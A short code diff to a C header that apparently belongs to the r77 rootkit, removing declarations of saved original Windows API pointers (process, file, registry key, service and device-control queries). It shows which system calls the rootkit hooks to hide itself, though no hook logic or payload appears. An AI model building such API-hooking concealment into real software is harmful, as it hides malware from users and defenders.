@@ -3,17 +3,6 @@
 #ifndef _HOOKS_H
 #define _HOOKS_H
 
-static NT_NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
-static NT_NTRESUMETHREAD OriginalNtResumeThread;
-static NT_NTQUERYDIRECTORYFILE OriginalNtQueryDirectoryFile;
-static NT_NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
-static NT_NTENUMERATEKEY OriginalNtEnumerateKey;
-static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
-static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
-static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW;
-static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
-static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
-
 /// <summary>
 /// Attaches hooks to r77 specific API's.
 /// </summary>
